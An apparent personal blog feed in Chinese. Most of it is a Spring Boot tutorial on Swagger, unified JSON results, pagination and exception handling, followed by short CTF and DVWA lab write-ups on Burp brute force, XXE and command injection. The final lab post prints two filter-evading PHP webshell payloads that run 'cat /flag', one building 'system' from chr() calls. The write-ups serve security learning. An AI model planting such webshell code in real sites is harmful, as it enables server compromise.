<h4 id="2-配置swagger2">2、配置Swagger2</h4>
<p>1）、创建common公共模块，为了让所有模块都可使用<br>
在guli-parent下创建模块common</p>
<p>配置：</p>
<p>groupId：com.achang</p>
<p>artifactId：common<br>
<img src="https://crlrlc.github.io//post-images/1687265329856.png" alt="" loading="lazy"></p>
<p>2）、在common中引入相关依赖</p>
<pre><code class="language-xml">&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
    &lt;scope&gt;provided &lt;/scope&gt;
&lt;/dependency&gt;
&lt;!--mybatis-plus--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.baomidou&lt;/groupId&gt;
    &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt;
    &lt;scope&gt;provided &lt;/scope&gt;
&lt;/dependency&gt;
&lt;!--lombok用来简化实体类：需要安装lombok插件--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
    &lt;artifactId&gt;lombok&lt;/artifactId&gt;
    &lt;scope&gt;provided &lt;/scope&gt;
&lt;/dependency&gt;
&lt;!--swagger--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;io.springfox&lt;/groupId&gt;
    &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;
    &lt;scope&gt;provided &lt;/scope&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;io.springfox&lt;/groupId&gt;
    &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;
    &lt;scope&gt;provided &lt;/scope&gt;
&lt;/dependency&gt;
&lt;!-- redis --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;
&lt;/dependency&gt;

&lt;!-- spring2.X集成redis所需common-pool2
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
            &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt;
            &lt;version&gt;2.6.0&lt;/version&gt;
        &lt;/dependency&gt;--&gt;
</code></pre>
<p>3）、在common下面创建子模块service-bas<br>
<img src="https://crlrlc.github.io//post-images/1687265409940.png" alt="" loading="lazy"></p>
<p>4）、在模块service-base中，创建swagger的配置类<br>
创建包 com.achang.servicebase.config ，创建类 SwaggerConfig</p>
<p>@EnableSwagger2</p>
<pre><code class="language-java">@Configuration
@EnableSwagger2
public class SwaggerConfig {

    @Bean
    public Docket webApiConfig(){
        return new Docket(DocumentationType.SWAGGER_2)
                .groupName(&quot;webApi&quot;)
                .apiInfo(webApiInfo())
                .select()
                .paths(Predicates.not(PathSelectors.regex(&quot;/admin/.*&quot;)))
                .paths(Predicates.not(PathSelectors.regex(&quot;/error.*&quot;)))
                .build();
    }


    private ApiInfo webApiInfo(){
        return new ApiInfoBuilder()
                .title(&quot;网站-课程中心API文档&quot;)
                .description(&quot;本文档描述了课程中心微服务接口定义&quot;)
                .version(&quot;1.0&quot;)
                .contact(new Contact(&quot;achang&quot;, &quot;http://achang.com&quot;,
                        &quot;995931576@qq.com&quot;))
                .build();
    }
}
</code></pre>
<p>5）、在模块service模块中引入service-base<br>
service/pom.xml中引入service-base的坐标</p>
<pre><code class="language-xml">&lt;dependencies&gt;
    &lt;dependency&gt;
        &lt;artifactId&gt;service-base&lt;/artifactId&gt;
        &lt;groupId&gt;com.achang&lt;/groupId&gt;
        &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
    &lt;/dependency&gt;
&lt;/dependencies&gt;
</code></pre>
<p>6）、在service-edu启动类上添加注解<br>
@ComponentScan(basePackages = &quot;com.achang&quot;)来扫描SwaggerConfig这个类<br>
<img src="https://crlrlc.github.io//post-images/1687265497326.png" alt="" loading="lazy"></p>
<pre><code class="language-java">@SpringBootApplication
@ComponentScan(basePackages = &quot;com.achang&quot;)
public class Service_edu_Main8001 {
    public static void main(String[] args) {
        SpringApplication.run(Service_edu_Main8001.class,args);
    }
}
</code></pre>
<p>7）测试<br>
访问：http://localhost:8001/swagger-ui.html<br>
<img src="https://crlrlc.github.io//post-images/1687265552834.png" alt="" loading="lazy"></p>
<p>8）、API模型，让swagger有更多提示<br>
可以添加一些自定义设置，例如：</p>
<p>定义样例数据</p>
<p>entity</p>
<pre><code class="language-java">@ApiModelProperty(value = &quot;创建时间&quot;)
@TableField(fill = FieldFill.INSERT)
private Date gmtCreate;

@ApiModelProperty(value = &quot;更新时间&quot;)
@TableField(fill = FieldFill.INSERT_UPDATE)
private Date gmtModified;
</code></pre>
<figure data-type="image" tabindex="16"><img src="https://crlrlc.github.io//post-images/1687265616934.png" alt="" loading="lazy"></figure>
<p>9）定义接口说明和参数说明<br>
定义在类上： @Api</p>
<p>定义在方法上： @ApiOperation</p>
<p>定义在参数上： @ApiParam</p>
<pre><code class="language-java">@RestController
@CrossOrigin //解决跨域问题
@RequestMapping(&quot;/eduservice/edu-teacher&quot;)
@Api(description=&quot;讲师管理&quot;)
public class EduTeacherController {

    @Autowired
    private EduTeacherService eduTeacherService;

    //查询讲师表所有数据
    @ApiOperation(value = &quot;所有讲师列表&quot;)
    @GetMapping(&quot;/findAll&quot;)
    public List&lt;EduTeacher&gt; list(){
        return eduTeacherService.list(null);
    }

    //逻辑删除讲师
    @ApiOperation(value = &quot;根据ID删除讲师&quot;)
    @DeleteMapping(&quot;/deleteTeacherById/{id}&quot;)
    public boolean deleteTeacherById(@PathVariable String id){
        return eduTeacherService.removeById(id);
    }

}
</code></pre>
<figure data-type="image" tabindex="17"><img src="https://crlrlc.github.io//post-images/1687265670678.png" alt="" loading="lazy"></figure>
<h3 id="十-统一返回结果对象">十、统一返回结果对象</h3>
<h4 id="1-统一返回数据格式json">1、统一返回数据格式Json</h4>
<p>项目中我们会将响应封装成json返回，一般我们会将所有接口的数据格式统一， 使前端(iOS Android,Web)对数据的操作更一致、轻松。</p>
<p>一般情况下，统一返回数据格式没有固定的格式，只要能描述清楚返回的数据状态以及要返回的具体数据就可以。</p>
<p>但是一般会包含状态码、返回消息、数据这几部分内容</p>
<p>我们的定义统一结果：</p>
<pre><code class="language-json">{
&quot;success&quot;: 布尔, //响应是否成功
&quot;code&quot;: 数字, //响应码
&quot;message&quot;: 字符串, //返回消息
&quot;data&quot;: HashMap //返回数据，放在键值对中
}
</code></pre>
<h4 id="2-创建统一结果返回类">2、创建统一结果返回类</h4>
<p>1）、在common模块下创建子模块 common-utils</p>
<p>2）、创建接口定义返回码<br>
创建包com.achang.commonutils，创建接口 ResultCode.java，抽取状态码，便于后期修改</p>
<pre><code class="language-java">package com.achang.commonutils;

public interface ResultCode {
    //状态码：成功
    public static Integer SUCCESS = 20000;
    //状态码：失败
    public static Integer ERROR = 20001;
}
</code></pre>
<p>4）、创建结果类</p>
<pre><code class="language-java">@Data
public class R {
    @ApiModelProperty(&quot;是否成功&quot;)
    private boolean success;

    @ApiModelProperty(&quot;响应码&quot;)
    private Integer code;

    @ApiModelProperty(&quot;返回信息&quot;)
    private String message;

    @ApiModelProperty(&quot;返回数据&quot;)
    private Map&lt;String, Object&gt; data = new HashMap&lt;String, Object&gt;();

    //无参构造方法私有
    private R() {
    }

    //成功 静态方法
    public static R ok(){
        R r = new R();
        r.setSuccess(true);
        r.setCode(ResultCode.SUCCESS);
        r.setMessage(&quot;成功。。。&quot;);
        return r;
    }

    //失败 静态方法
    public static R error(){
        R r = new R();
        r.setSuccess(false);
        r.setCode(ResultCode.ERROR);
        r.setMessage(&quot;失败&quot;);
        return r;
    }

    public R success(Boolean success){
        this.setSuccess(success);
        return this;
    }

    public R code(Integer code){
        this.setCode(code);
        return this;
    }

    public R message(String message){
        this.setMessage(message);
        return this;
    }

    public R data(String key,Object value){
        this.data.put(key,value);
        return this;
    }

    public R data(Map&lt;String,Object&gt; map){
        this.setData(map);
        return this;
    }

}
</code></pre>
<h4 id="3-统一返回结果使用">3、统一返回结果使用</h4>
<p>1）、在service模块中添加依赖</p>
<pre><code class="language-xml">&lt;dependency&gt;
    &lt;groupId&gt;com.achang&lt;/groupId&gt;
    &lt;artifactId&gt;common-utils&lt;/artifactId&gt;
    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>2）、修改Controller中的返回结果</p>
<p>修改返回结果为R</p>
<pre><code class="language-java">//查询讲师表所有数据
@ApiOperation(value = &quot;所有讲师列表&quot;)
@GetMapping(&quot;/findAll&quot;)
public R list(){
    List&lt;EduTeacher&gt; list = eduTeacherService.list(null);
    return R.ok().data(&quot;items&quot;,list);
}

//逻辑删除讲师
@ApiOperation(value = &quot;根据ID删除讲师&quot;)
@DeleteMapping(&quot;/deleteTeacherById/{id}&quot;)
public R deleteTeacherById(@ApiParam(name = &quot;id&quot;, value = &quot;讲师ID&quot;, required = true)@PathVariable String id){
    boolean flag = eduTeacherService.removeById(id);
    if (flag){
        return R.ok();
    }else {
        return R.error();
    }
}
</code></pre>
<h3 id="十一-分页和多条件查询接口开发">十一、分页和多条件查询接口开发</h3>
<h4 id="1-分页">1、分页</h4>
<p>1）、MyBatisPlusConfig中配置分页插件</p>
<pre><code class="language-java">/**
* 分页插件
*/
@Bean
public PaginationInterceptor paginationInterceptor() {
return new PaginationInterceptor();
}
</code></pre>
<p>2）、分页Controller方法</p>
<pre><code class="language-java">    //分页查询
    //page：当前页
    //limit：每页显示记录数
    @ApiOperation(value = &quot;分页讲师列表&quot;)
    @GetMapping(&quot;/pageList/{page}/{limit}&quot;)
    public R pageList(@ApiParam(name = &quot;page&quot;, value = &quot;当前页码&quot;, required = true)@PathVariable Long page,
                      @ApiParam(name = &quot;limit&quot;, value = &quot;每页记录数&quot;, required = true)@PathVariable Long limit
                      ){
        Page&lt;EduTeacher&gt; pageParam = new Page&lt;&gt;(page, limit);
        //分页查询，查完后，会将数据封装在pageParam中
        eduTeacherService.page(pageParam,null);
        //获取查询到的数据
        List&lt;EduTeacher&gt; records = pageParam.getRecords();
        //获取总记录数
        long total = pageParam.getTotal();
        return R.ok().data(&quot;total&quot;,total).data(&quot;rows&quot;,records);
    }
</code></pre>
<p>3）、Swagger中测试</p>
<h4 id="2-多条件组合查询带分页">2、多条件组合查询带分页</h4>
<p>根据讲师名称name，讲师头衔level、讲师入驻时间gmt_create（时间段）查询</p>
<p>1）、创建查询对象</p>
<p>创建service_edu中com.achang.eduservice.entity.vo包，创建TeacherQuery.java查询对象</p>
<p>TeacherQuery的属性根据前端需要的查询条件来设置</p>
<pre><code class="language-java">@ApiModel(value = &quot;Teacher查询对象&quot;, description = &quot;讲师查询对象封装&quot;)
@Data
public class TeacherQuery implements Serializable {

    private static final long serialVersionUID = 1L;

    @ApiModelProperty(value = &quot;教师名称,模糊查询&quot;)
    private String name;

    @ApiModelProperty(value = &quot;头衔 1高级讲师 2首席讲师&quot;)
    private Integer level;

    @ApiModelProperty(value = &quot;查询开始时间&quot;, example = &quot;2019-01-01 10:10:10&quot;)
    private String begin;//注意，这里使用的是String类型，前端传过来的数据无需进行类型转换

    @ApiModelProperty(value = &quot;查询结束时间&quot;, example = &quot;2019-12-01 10:10:10&quot;)
    private String end;

}
</code></pre>
<p>2）、service</p>
<p>接口</p>
<pre><code class="language-java">public interface EduTeacherService extends IService&lt;EduTeacher&gt; {
    //多条件查询讲师带分页
    void pageQuery(Page&lt;EduTeacher&gt; pageParam,TeacherQuery teacherQuery);
}
</code></pre>
<p>实现impl</p>
<pre><code class="language-java">@Service
public class EduTeacherServiceImpl extends ServiceImpl&lt;EduTeacherMapper, EduTeacher&gt; implements EduTeacherService {

    @Override
    public void pageQuery(Page&lt;EduTeacher&gt; pageParam, TeacherQuery teacherQuery) {

        //构建条件
        QueryWrapper&lt;EduTeacher&gt; wrapper = new QueryWrapper&lt;&gt;();

        //取出值，判断他们是否有值
        String name = teacherQuery.getName();
        Integer level = teacherQuery.getLevel();
        String begin = teacherQuery.getBegin();
        String end = teacherQuery.getEnd();

        //判断条件值是否为空，如果不为空，拼接条件
        //判断是否有传入教师名
        if (!StringUtils.isEmpty(name)){
            //构建条件
            wrapper.like(&quot;name&quot;,name);//参数1：数据库字段名； 参数2：模糊查询的值
        }
        //判断是否传入教师头衔
        if (!StringUtils.isEmpty(level)){
            //构造条件
            wrapper.eq(&quot;level&quot;,level);
        }
        if (!StringUtils.isEmpty(begin)){
            //构造条件
            wrapper.ge(&quot;gmt_create&quot;,begin);//ge：大于等于
        }
        if (!StringUtils.isEmpty(begin)){
            //构造条件
            wrapper.le(&quot;gmt_modified&quot;,end);//le:小于等于
        }
		
        //带上门判断后的条件进行分页查询
        baseMapper.selectPage(pageParam, wrapper);
    }
    
}
</code></pre>
<p>3）、controller<br>
<img src="https://crlrlc.github.io//post-images/1687266021482.png" alt="" loading="lazy"></p>
<p>增加参数TeacherQuery teacherQuery，非必选</p>
<pre><code class="language-java">    //多条件查询讲师带分页
    @ApiOperation(value = &quot;多条件查询讲师带分页&quot;)
    @PostMapping(&quot;/pageTeacherCondition/{page}/{limit}&quot;)
    public R pageTeacherCondition(@ApiParam(name = &quot;page&quot;, value = &quot;当前页码&quot;, required = true)@PathVariable Long page,
                                  @ApiParam(name = &quot;limit&quot;, value = &quot;每页记录数&quot;, required = true)@PathVariable Long limit,
                                  @RequestBody(required = false) TeacherQuery teacherQuery){//通过封装TeacherQuery对象来直接传递查询条件
        //创建分页page对象
        Page&lt;EduTeacher&gt; pageParam = new Page&lt;&gt;(page, limit);

        //调用方法实现多条件分页查询
        eduTeacherService.pageQuery(pageParam,teacherQuery);

        //获取查询到的数据
        List&lt;EduTeacher&gt; records = pageParam.getRecords();

        //获取总记录数
        long total = pageParam.getTotal();
        return R.ok().data(&quot;total&quot;,total).data(&quot;rows&quot;,records);
        
    }
</code></pre>
<h3 id="十二-新增和修改讲师接口开发">十二、新增和修改讲师接口开发</h3>
<h4 id="1-自动填充封装">1、自动填充封装</h4>
<p>给新增数据和修改数据，添加新建时间和修改时间的自动填充封装功能</p>
<p>1）、在service-base模块中添加</p>
<p>创建包handler，创建自动填充类 MyMetaObjectHandler</p>
<pre><code class="language-java">@Component
public class MyMetaObjectHandler implements MetaObjectHandler {
    @Override
    public void insertFill(MetaObject metaObject) {
        //参数1：对应类中的属性名称
        this.setFieldValByName(&quot;gmtCreate&quot;, new Date(), metaObject);
        this.setFieldValByName(&quot;gmtModified&quot;, new Date(), metaObject);
    }
    @Override
    public void updateFill(MetaObject metaObject) {
        this.setFieldValByName(&quot;gmtModified&quot;, new Date(), metaObject);
    }
}
</code></pre>
<p>2）、在实体类添加自动填充注解<br>
<img src="https://crlrlc.github.io//post-images/1687266103175.png" alt="" loading="lazy"></p>
<h4 id="2-controller方法定义">2、controller方法定义</h4>
<p>1）、新增</p>
<pre><code class="language-java">//新增讲师
@ApiModelProperty(value = &quot;新增讲师&quot;)
@PostMapping(&quot;/save&quot;)
public R save(@RequestBody EduTeacher eduTeacher){
    boolean flag = eduTeacherService.save(eduTeacher);
    if (flag){
        return R.ok();
    }else {
        return R.error();
    }
}
</code></pre>
<p>2)、根据id查询</p>
<pre><code class="language-java">//根据id查询,用于信息回显
@ApiModelProperty(value = &quot;根据id查询&quot;)
@GetMapping(&quot;/getById/{id}&quot;)
public R getById(@PathVariable String id){
    EduTeacher teacher = eduTeacherService.getById(id);
    return R.ok().data(&quot;item&quot;,teacher);
}
</code></pre>
<p>3)、修改讲师</p>
<pre><code class="language-java">    //修改讲师
    @ApiModelProperty(value = &quot;修改讲师&quot;)
    @PostMapping(&quot;/updateById&quot;)
    public R updateById(@RequestBody EduTeacher teacher){
        boolean flag = eduTeacherService.updateById(teacher);
        if (flag){
            return R.ok();
        }else {
            return R.error();
        }
    }
</code></pre>
<h3 id="十三-统一异常处理">十三、统一异常处理</h3>
<h4 id="1-统一异常处理">1、统一异常处理</h4>
<p>1）、创建统一异常处理器</p>
<p>引入依赖：因为要使用common-utils中的返回类R<br>
<img src="https://crlrlc.github.io//post-images/1687266206153.png" alt="" loading="lazy"></p>
<pre><code class="language-xml">&lt;dependency&gt;
    &lt;groupId&gt;com.achang&lt;/groupId&gt;
    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
    &lt;artifactId&gt;common-utils&lt;/artifactId&gt;
&lt;/dependency&gt;
</code></pre>
<p>在service_base中创建统一异常处理类exceptionHandler/GlobalExceptionHandler.java：</p>
<pre><code class="language-java">@ControllerAdvice
public class GlobalExceptionHandler {

    //指定出现什么异常会执行这个方法
    @ExceptionHandler(Exception.class)
    //因为他不在Controller中。没有@RestController，所以数据不会返回，需要加@ResponeseBody返回数据
    @ResponseBody
    public R error(Exception e){
        e.printStackTrace();
        return R.error().message(&quot;执行了全局异常处理。。。&quot;);
    }
    
}
</code></pre>
<p>2）、测试<br>
<img src="https://crlrlc.github.io//post-images/1687266275740.png" alt="" loading="lazy"></p>
<h4 id="2-处理特定异常">2、处理特定异常</h4>
<p>1）、添加异常处理方法</p>
<p>exceptionHandler/GlobalExceptionHandler.java中添加<br>
<img src="https://crlrlc.github.io//post-images/1687266314129.png" alt="" loading="lazy"></p>
<pre><code class="language-java">@ExceptionHandler(ArithmeticException.class)
@ResponseBody
public R error(ArithmeticException e){
    e.printStackTrace();
    return R.error().message(&quot;执行了自定义异常&quot;);
}
</code></pre>
<p>2）、测试<br>
<img src="https://crlrlc.github.io//post-images/1687266355951.png" alt="" loading="lazy"></p>
<h4 id="3-自定义异常">3、自定义异常</h4>
<p>1）、创建自定义异常类</p>
<pre><code class="language-java">@Data
@AllArgsConstructor
@NoArgsConstructor
public class AchangException {
    @ApiModelProperty(value = &quot;状态码&quot;)
    private Integer code;
    private String msg;
}
</code></pre>
<p>2）、业务中需要的位置抛出AchangException</p>
<p>在需要用的地方，直接抛出自定义的异常类</p>
<p><img src="https://crlrlc.github.io//post-images/1687266420972.png" alt="" loading="lazy"><br>
3）、添加异常处理方法</p>
<p>exceptionHandler/GlobalExceptionHandler中添加处理这个异常的处理器</p>
<pre><code class="language-java">@ExceptionHandler(AchangException.class)
@ResponseBody
public R error(AchangException e){
    e.printStackTrace();;
    return R.error().message(e.getMsg()).code(e.getCode());
}
</code></pre>
<p>4）、测试<br>
<img src="https://crlrlc.github.io//post-images/1687266471200.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[用burpsuit进行暴力破解]]></title>
        <id>https://crlrlc.github.io/post/yong-burpsuit-jin-xing-bao-li-po-jie/</id>
        <link href="https://crlrlc.github.io/post/yong-burpsuit-jin-xing-bao-li-po-jie/">
        </link>
        <updated>2021-01-27T02:16:07.000Z</updated>
        <content type="html"><![CDATA[<p>用到的软件：burpsuit。目标网站：本机上的dvwa靶场<br>
1、首先在网站上下载dvwa，网址：http://dvwa.co.uk，若网站打不开，可以去GitHub上下载<br>
2、把得到的压缩包解压出来并复制到php集成开发环境上<br>
<img src="https://crlrlc.github.io//post-images/1611717077760.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717095963.png" alt="" loading="lazy"></p>
<p>3、这里有一点要注意的是，dvwa中的config需要设置一下：<br>
<img src="https://crlrlc.github.io//post-images/1611717116751.png" alt="" loading="lazy"></p>
<p>4、这时候在网页上输入：“127.0.0.1/dvwa就可以到靶场上了”，需要注意的是第一次进靶场是需要用户名和密码的，密码分别是“admin”，“password”<br>
<img src="https://crlrlc.github.io//post-images/1611717141056.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717167459.png" alt="" loading="lazy"></p>
<p>5、开始破解<br>
<img src="https://crlrlc.github.io//post-images/1611717227839.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717248515.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717263885.png" alt="" loading="lazy"><br>
1）这里需要注意一些问题<br>
<img src="https://crlrlc.github.io//post-images/1611717299210.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717311414.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717335712.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717366931.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717387838.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717462449.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717470236.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1611717476885.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[老烟枪]]></title>
        <id>https://crlrlc.github.io/post/lao-yan-qiang/</id>
        <link href="https://crlrlc.github.io/post/lao-yan-qiang/">
        </link>
        <updated>2020-12-23T12:06:12.000Z</updated>
        <content type="html"><![CDATA[<p>1、打开题目，发现与之前不同的是它不在给出网站了，而是给出压缩包<br>
<img src="https://crlrlc.github.io//post-images/1608725278266.png" alt="" loading="lazy"><br>
2、解压出来后发现是图片：<br>
<img src="https://crlrlc.github.io//post-images/1608725342984.jpg" alt="" loading="lazy"><br>
3、于是我们打开kali虚拟机，（kali其实是Linux系统的一个版本，里边附带了很多渗透测试的工具），并把图片拖进去，并打开终端输入如图所示的一些指令：<br>
<img src="https://crlrlc.github.io//post-images/1608725761265.png" alt="" loading="lazy"><br>
4、打开文件夹，我们可以得到flag，他是倒过来的，如图所示：<br>
<img src="https://crlrlc.github.io//post-images/1608725899561.png" alt="" loading="lazy"><br>
5、我们试着把他拖出来：<br>
<img src="https://crlrlc.github.io//post-images/1608726017021.png" alt="" loading="lazy"><br>
6、如图：<br>
<img src="https://crlrlc.github.io//post-images/1608726052428.png" alt="" loading="lazy"><br>
反转处理后：<br>
<img src="https://crlrlc.github.io//post-images/1608726139656.png" alt="" loading="lazy"><br>
7、任务完成！</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[神奇的登录框]]></title>
        <id>https://crlrlc.github.io/post/shen-qi-de-deng-lu-kuang/</id>
        <link href="https://crlrlc.github.io/post/shen-qi-de-deng-lu-kuang/">
        </link>
        <updated>2020-11-25T11:37:56.000Z</updated>
        <content type="html"><![CDATA[<p>1、打开题目，得到一个登录窗<br>
<img src="https://crlrlc.github.io//post-images/1606304463434.png" alt="" loading="lazy"><br>
2、把一个神奇的指令输进去并按下查询键：<br>
<img src="https://crlrlc.github.io//post-images/1606304577387.png" alt="" loading="lazy"><br>
3、可以发现页面并没有发生变化，但是我们在网址上输一个1.txt进去：<br>
<img src="https://crlrlc.github.io//post-images/1606304836043.png" alt="" loading="lazy"><br>
4、接下来返回到登录窗，输入一个指令并点击查询，如图所示：<br>
<img src="https://crlrlc.github.io//post-images/1606305133537.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1606305184429.png" alt="" loading="lazy"><br>
5、可以发现页面虽然并没有什么变化，不过和刚刚一样，在网址栏输入/2.txt，就可以得到flag了：<br>
<img src="https://crlrlc.github.io//post-images/1606305311522.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Who are you?]]></title>
        <id>https://crlrlc.github.io/post/who-are-you/</id>
        <link href="https://crlrlc.github.io/post/who-are-you/">
        </link>
        <updated>2020-11-25T11:21:57.000Z</updated>
        <content type="html"><![CDATA[<p>1、打开题目发现这个玩意：<br>
<img src="https://crlrlc.github.io//post-images/1606303752487.png" alt="" loading="lazy"><br>
2、打开burpsuit并把得到的东西发到重发器上并加上xxe：<br>
<img src="https://crlrlc.github.io//post-images/1606303852167.png" alt="" loading="lazy"><br>
3、发送后得到这个东西：<br>
<img src="https://crlrlc.github.io//post-images/1606303963668.png" alt="" loading="lazy"><br>
4、再把得到的一大串字母copy到解码器上用bese64解码一下得到flag：<br>
<img src="https://crlrlc.github.io//post-images/1606304117036.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[G2mtu学生?]]></title>
        <id>https://crlrlc.github.io/post/g2mtu-xue-sheng/</id>
        <link href="https://crlrlc.github.io/post/g2mtu-xue-sheng/">
        </link>
        <updated>2020-11-25T10:34:15.000Z</updated>
        <content type="html"><![CDATA[<p>1、打开题目，发现这样一个东西：<br>
<img src="https://crlrlc.github.io//post-images/1606300573295.png" alt="" loading="lazy"><br>
2、打开burpsuit发现这样的东西<br>
<img src="https://crlrlc.github.io//post-images/1606300665780.png" alt="" loading="lazy"><br>
3、把拦截的东西发到重发器上：<br>
<img src="https://crlrlc.github.io//post-images/1606300868908.png" alt="" loading="lazy"><br>
4、最终得到flag文件：<br>
<img src="https://crlrlc.github.io//post-images/1606300943423.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[力口做题]]></title>
        <id>https://crlrlc.github.io/post/li-kou-zuo-ti/</id>
        <link href="https://crlrlc.github.io/post/li-kou-zuo-ti/">
        </link>
        <updated>2020-11-20T15:15:26.000Z</updated>
        <content type="html"><![CDATA[<p>题目如下：<br>
<img src="https://crlrlc.github.io//post-images/1605885416449.png" alt="" loading="lazy"><br>
结果：<br>
太菜了，做不出来，只能看答案😰<br>
答案如下：<br>
<img src="https://crlrlc.github.io//post-images/1605885468484.png" alt="" loading="lazy"><br>
心得：<br>
整体思路：创建一个新的动态数组与原数组相对应，并利用if的结构为手段来把空格字符代替成%20来达到目的<br>
答案的流程：<br>
1、创建动态数组；<br>
2、将新数组与原数组相对应，并把‘ ’代替成%20，这就是新数组的长度是原数组的3倍的原因。因为字符数组最后有\0,所以length*3再+1.</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[unserialize4]]></title>
        <id>https://crlrlc.github.io/post/unserialize4/</id>
        <link href="https://crlrlc.github.io/post/unserialize4/">
        </link>
        <updated>2020-11-08T03:26:54.000Z</updated>
        <content type="html"><![CDATA[<p>##写在前面：<br>
又是在大佬的帮助下，我又学会了一道题😂，突然发现所有的靶没有一个是我自己独立解决的😂，下面是步骤<br>
##过程：<br>
<img src="https://crlrlc.github.io//post-images/1604806928412.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604806935375.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604806941149.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604806947382.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604806951798.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[第四次打靶]]></title>
        <id>https://crlrlc.github.io/post/di-si-ci-da-ba/</id>
        <link href="https://crlrlc.github.io/post/di-si-ci-da-ba/">
        </link>
        <updated>2020-10-31T15:05:26.000Z</updated>
        <content type="html"><![CDATA[<p>##在师兄的指导下，我进行了底四次靶场实验下面是步骤<br>
<img src="https://crlrlc.github.io//post-images/1604156810423.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604156815676.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604156820417.png" alt="" loading="lazy"><br>
##补充<br>
upload3那题我失败了，原因是.htaccess没有双写，只是双写了1.aaa中的木马，<br>
<img src="https://crlrlc.github.io//post-images/1604157027025.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604157109287.png" alt="" loading="lazy"><br>
此外，我还知道了一个不用蚁剑的办法：<br>
1.aaa<br>
可以是<br>
&lt;?pphphp<br>
echo <code>cat /flag</code>;</p>
<pre><code>也可以是
&lt;  ?pphphp
$a = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
$a('cat /flag');

这两个方法就直接访问就行了，不需要用蚁剑   </code></pre>
]]></content>
    </entry>
</feed>